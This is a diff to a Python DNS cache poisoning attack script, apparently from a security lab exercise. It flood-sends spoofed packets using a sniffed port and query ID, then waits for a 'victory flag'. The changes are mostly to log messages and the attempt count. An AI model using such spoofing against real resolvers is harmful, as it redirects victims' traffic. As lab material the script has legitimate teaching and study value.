@@ -52,7 +52,7 @@ VICTORY_FLAG_PORT = 1337
 BUFFER_SIZE = 8192
 
 NUMBER_OF_PACKETS = 2000  # number of packets per attempt
-NUMBER_OF_ATTEMPTS = 100  # if the attack with 100 fails, please increase
+NUMBER_OF_ATTEMPTS = 250  # if the attack continue to fail, please increase, it is set to lower numbers just for debug
 TIME_SLEEP_SECONDS = 2  # seconds of delay before attack
 
 ATTACK_GOING_ON = True
@@ -77,7 +77,7 @@ def dns_server_routine():
     while ATTACK_GOING_ON:
         a = sniff(filter="port " + str(BAD_DNS_SERVER_PORT), count=1, promisc=1)
         if a[0].haslayer(IP):
-            print(DNS_ROUTINE_HEADER + "Packet sniffed, analyzing..")
+            # print(DNS_ROUTINE_HEADER + "Packet sniffed, analyzing...")
             sniffed_packet = a[0]
             sniffed_ip = sniffed_packet.getlayer(IP)
             target_port = sniffed_ip.sport
@@ -85,7 +85,7 @@ def dns_server_routine():
             #      + ", src port: " + str(sniffed_ip.sport))
             # print(DNS_ROUTINE_HEADER + "Dst ip:" + str(sniffed_ip.dst) + ", dest port:" + str(sniffed_ip.dport))
             if TARGET_PORT != target_port:
-                print(DNS_ROUTINE_HEADER + "New target port is " + str(target_port))
+                print(DNS_ROUTINE_HEADER + "New target port is \"" + str(target_port) + "\".")
                 TARGET_PORT = target_port
             if sniffed_packet.haslayer(DNS):
                 first_query_id = sniffed_packet.getlayer(DNS).id
@@ -96,7 +96,7 @@ def dns_server_routine():
                     print(DNS_ROUTINE_HEADER + "Packet not decoded, probably attack failure! Skipping on...")
                     continue
 
-            print(DNS_ROUTINE_HEADER + "New query id found is " + str(first_query_id))
+            print(DNS_ROUTINE_HEADER + "New query id found is \"" + str(first_query_id) + "\".")
             STARTING_QUERY_ID = first_query_id
 
             # we just reply here to the request
@@ -218,7 +218,7 @@ def flag_victory_listener():
     while ATTACK_GOING_ON:
         try:
             data, addr = sock.recvfrom(BUFFER_SIZE)
-            print(LISTENER_HEADER + "\n\nReceived from \"" + addr[0] + "\": " + str(data) + "\n\n")
+            print(LISTENER_HEADER + "Received from \"" + addr[0] + "\": " + str(data))
             ATTACK_GOING_ON = False
         except KeyboardInterrupt:
             print(LISTENER_HEADER + "Closing socket to exit gracefully...")
@@ -236,7 +236,7 @@ def main():
     print(MAIN_HEADER + "Initializing attack...")
     flag_victory_thread = threading.Thread(name="flag_victory_thread", target=flag_victory_listener)
     print(MAIN_HEADER + "Listener thread created!")
-    print(MAIN_HEADER + "Starting listener to get victory flag")
+    print(MAIN_HEADER + "Starting listener to get victory flag...")
     flag_victory_thread.start()
 
     # point 1: send a dns request for badguy.ru
